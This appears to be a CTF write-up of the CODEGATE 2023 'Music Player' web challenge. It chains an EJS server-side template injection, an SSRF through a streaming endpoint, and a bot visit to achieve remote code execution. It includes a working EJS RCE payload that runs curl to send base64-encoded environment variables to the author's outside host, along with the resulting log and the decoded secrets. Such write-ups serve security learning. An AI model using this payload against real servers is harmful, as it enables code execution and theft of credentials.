# CODEGATE Music Player

This was a web challenge where the web page showed a list of songs that could be played.

Luckily, we were given the source code, as most of the interesting functionality was not reachable through simple navigation from the main page.

The problem consist of 4 components:
* Frontend
* Redis
* Server
* Worker

The worker is a headleass chrome that is started with puppeteer. It has the cookie `SECRET` set to `env.SECRET`. Whenever a new URL is added to the redis cache, the worker will visit it.

The most interesting parts were in the server in the `main.js` file. There all the routes were defined.

Initially the `/api/flag` route looked interesting, but I did not find a way to set the `SECRET` cookie to `env.FLAG`. Thus I looked at other things.
```JavaScript
app.patch("/api/flag", (req, res) => {
    const { flag } = req.body
    if (!req.cookies["SECRET"] || req.cookies[SECRET] !== FLAG) {
        return sendResponse(res, "Nope", 403)
    }
    return res.render("flag", flag)
})
```

The next interesting part was the `/api/messages` endpoint. If the `SECRET` cookie was set to `env.SECRET`, the user controlled `id` parameter was passed direcly to `res.render` without sanitization.  
```JavaScript
app.post("/api/messages", (req, res) => {
    const { id } = req.body
    if (!req.cookies["SECRET"] || req.cookies["SECRET"] !== SECRET) {
        return sendResponse(res, "Nope", 403)
    }
    return res.render("admin", {...id})
})
```

Render is used to render a view. In this case, ` "ejs": "^3.1.9",` was used as the view engine.
There are a lot of resources about Server Side Template Injection to RCE in EJS.
* https://eslam.io/posts/ejs-server-side-template-injection-rce/
* https://hxp.io/blog/101/hxp-CTF-2022-valentine/
* https://github.com/CyberHeroRS/writeups/blob/main/SEETF/2023/Express-JavaScript-Security/writeup/writeup.md
* https://github.com/mde/ejs/issues/735


The basic idea is that the data and options for the render function are merged together. So it's possible to overwrite options with data sent n the `id` parameter. For more details, please red the links above.

I patched out the `SECRET` check locally to try to see if I can get a working payload. After some tiral and error I came up with the following:
```JSON
{"id":{"debug":true,"settings":{"view options":{"client":true,"escapeFunction":"function(){};{process.mainModule.require('child_process').execSync('curl http://p3.yt/$(env|base64 -w0)')}"}},"cache":false}}
```

This read out the environment variables and sent them to my remote server. What was lef to do was for the worker bot to visit our page.


The `/api/inquiry` endpoint allowed to push an arbitrary URL to the redis cache. All the checks are basically just a small proof of work to not bruteforce the servere too hard.
We remember that the worker will visit any new URL added to the redis cache.
```JavaScript
app.get("/api/inquiry", (req, res) => {
    if(!req.session.lastValue || !req.session.lastLength){
        req.session.lastLength = DIFFICULTY
        req.session.lastValue = generateRandomString(DIFFICULTY)
        return sendResponse(res, `${req.session.lastLength}/${req.session.lastValue}`)
    }

    if(!req.query.url || typeof req.query.url !== "string"){
        return sendResponse(res, "No Hack!", 500)
    }

    if(!req.query.checksum || getLastCharacterMD5((req.query.checksum || ''), DIFFICULTY) !== req.session.lastValue){
        req.session.lastLength = DIFFICULTY
        req.session.lastValue = generateRandomString(DIFFICULTY)
        return sendResponse(res, `${req.session.lastLength}/${req.session.lastValue}`, 500)
    }

    redisQuery.rpush("query", req.query.url)
    req.session.lastLength = DIFFICULTY
    req.session.lastValue = generateRandomString(DIFFICULTY)

    return sendResponse(res, "Complete")
})
```

We're almost there, but we the `SECRET` cookie on the worker bot was set for `"domain": "nginx"`. Thus, there is one more piece to the puzzle.

The `/api/stream` endpoint accepts an arbitrary URL. The URL has to pass a few checks. It has to start with `http(s)` and not point to a internal IP. Additionally, the content-type of the response needs to be one of `const allowedContentTypes = ["audio/mpeg", "audio/mp3", "audio/wav", "audio/ogg"]`. If all of the checks are passed, the URL is called and the response returned.

```JavaScript
// run streaming
app.get("/api/stream/:url", (req, res) => {

    try {
        let url = req.params.url
        const domain = new URL(url).hostname

        // prevent memory overload
        redisCache.dbsize((err, result) => {
            if(result >= 256){
                redisCache.flushdb()
            }
        })

        // preventing DNS attacks, etc.
        getIPAddress(domain)
            .then(ipAddress => {
                if(!url.startsWith("http://") && !url.startsWith("https://")){
                    url = STATIC_HOST.concat(url).replace("..", "").replace("%2e%2e", "").replace("%2e.", "").replace(".%2e", "")
                }else{
                    if(isInternalIP(ipAddress)) return sendResponse(res, "No Hack!", 500)
                }

                // redis || axios
                redisCache.get(url.split("?")[0], (err, result) => {
                    if (err || !result){
                        axios
                            .get(url, { responseType: "arraybuffer", timeout: 3000 })
                            .then(response => {
                                if (!allowedContentTypes.includes(response.headers["content-type"])){
                                    return sendResponse(res, "Not a valid music file", 500)
                                }
                                if (response.data.byteLength >= 1024 * 1024 * 3) {
                                    return sendResponse(res, "Music file is too big", 500)
                                }
                                redisCache.set(url, response.data.toString("hex"))
                                app.log.error(url)
                                return sendResponse(res, response.data)
                            })
                            .catch(err => {
                                return sendResponse(res, err, 500)
                            })
                    }else{
                        return sendResponse(res, Buffer.from(result, "hex"))
                    }
                })
            })
            .catch(e => {
                return sendResponse(res, "No Hack!", 500)
            })
    } catch (err) {
        return sendResponse(res, "Failed Streaming!", 500)
    }
})
```

With this, we can finanlly put togeter the whole exploit chain.

We craft the URL `http:///nginx/api/stream/http://p3.yt/p3.html`. This will point to our server with the malicious EJS payload. This payload will make a call to `/api/messages` with the `JSON` body described earlier. The content-type of this response is set to `audio/mpeg`. 

We use `/api/inquiry` to put this URL into the redis cache, which will trigger the worker bot to visit it. Because the worker bot has the`SECRET` cookie set for the `nginx` domain, the call to `/api/messages` will  be made with the cookie and thus reach the injection point. 

The final URl looked like this: 

`url = f'http://3.36.93.133/api/inquiry?url=http%3A%2F%2Fnginx%2Fapi%2Fstream%2Fhttp%253A%252F%252Fp3%2Eyt%252Fp3%2Ehtml&checksum={checksum}'`

When executed, the server will send us all the environment variables:

```
3.36.93.133 - - [18/Jun/2023 14:05:25] "GET /p3.html HTTP/1.1" 200 -
3.36.93.133 - - [18/Jun/2023 14:05:25] "GET /QVBQX0hPU1Q9MC4wLjAuMApSRURJU19VUkxfQ0FDSEU9cmVkaXM6Ly9yZWRpczo2Mzc5LzAKTk9ERV9WRVJTSU9OPTE4LjE2LjAKSE9TVE5BTUU9OWUzNzNjMjdjOGE2CllBUk5fVkVSU0lPTj0xLjIyLjE5CkhPTUU9L2hvbWUvY3RmCkFQUF9QT1JUPTUwMDAKRElGRklDVUxUWT02ClNUQVRJQ19IT1NUPS9hcGkvClBBVEg9L3Vzci9sb2NhbC9zYmluOi91c3IvbG9jYWwvYmluOi91c3Ivc2JpbjovdXNyL2Jpbjovc2JpbjovYmluClNFQ1JFVD0yNjE0Y2ZmNjdlMmI0OTkwNzAwNDM4ZTgyNDFiNjZlNwpSRURJU19VUkxfUVVFUlk9cmVkaXM6Ly9yZWRpczo2Mzc5LzEKUFdEPS9hcHAKQVBJX1VSTD1odHRwczovL2ZlLmd5L2NvcHlyaWdodC1mcmVlLWNvbnRlbnQvCkZMQUc9Y29kZWdhdGUyMDIze2Nhbl93ZV9jYUxMX3RoaXNfYV8wZGF5P3ZlbmQwcl9zYXlzX2l0X2lzX3RoZV9kZXZlbG9wZXJzX21pc3Rha2VfdG9fY29kZV9saWtlX3RoaXN9Ck5PREVfRU5WPXByb2R1Y3Rpb24K HTTP/1.1" 404 -
```

We can decode it to get the flag:
```bash
$ echo  -n "QVBQX0hPU1Q9MC4wLjAuMApSRURJU19VUkxfQ0FDSEU9cmVkaXM6Ly9yZWRpczo2Mzc5LzAKTk9ERV9WRVJTSU9OPTE4LjE2LjAKSE9TVE5BTUU9OWUzNzNjMjdjOGE2CllBUk5fVkVSU0lPTj0xLjIyLjE5CkhPTUU9L2hvbWUvY3RmCkFQUF9QT1JUPTUwMDAKRElGRklDVUxUWT02ClNUQVRJQ19IT1NUPS9hcGkvClBBVEg9L3Vzci9sb2NhbC9zYmluOi91c3IvbG9jYWwvYmluOi91c3Ivc2JpbjovdXNyL2Jpbjovc2JpbjovYmluClNFQ1JFVD0yNjE0Y2ZmNjdlMmI0OTkwNzAwNDM4ZTgyNDFiNjZlNwpSRURJU19VUkxfUVVFUlk9cmVkaXM6Ly9yZWRpczo2Mzc5LzEKUFdEPS9hcHAKQVBJX1VSTD1odHRwczovL2ZlLmd5L2NvcHlyaWdodC1mcmVlLWNvbnRlbnQvCkZMQUc9Y29kZWdhdGUyMDIze2Nhbl93ZV9jYUxMX3RoaXNfYV8wZGF5P3ZlbmQwcl9zYXlzX2l0X2lzX3RoZV9kZXZlbG9wZXJzX21pc3Rha2VfdG9fY29kZV9saWtlX3RoaXN9Ck5PREVfRU5WPXByb2R1Y3Rpb24K" | base64 -d

APP_HOST=0.0.0.0
REDIS_URL_CACHE=redis://redis:6379/0
NODE_VERSION=18.16.0
HOSTNAME=9e373c27c8a6
YARN_VERSION=1.22.19
HOME=/home/ctf
APP_PORT=5000
DIFFICULTY=6
STATIC_HOST=/api/
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SECRET=2614cff67e2b4990700438e8241b66e7
REDIS_URL_QUERY=redis://redis:6379/1
PWD=/app
API_URL=https://fe.gy/copyright-free-content/
FLAG=codegate2023{can_we_caLL_this_a_0day?vend0r_says_it_is_the_developers_mistake_to_code_like_this}
NODE_ENV=production
```

See `s.py` and `brute.py` for the full server and client scripts used for the attack.

Thanks to @bluepichu for the discussion and help with all the web stuff I failed at horribly.
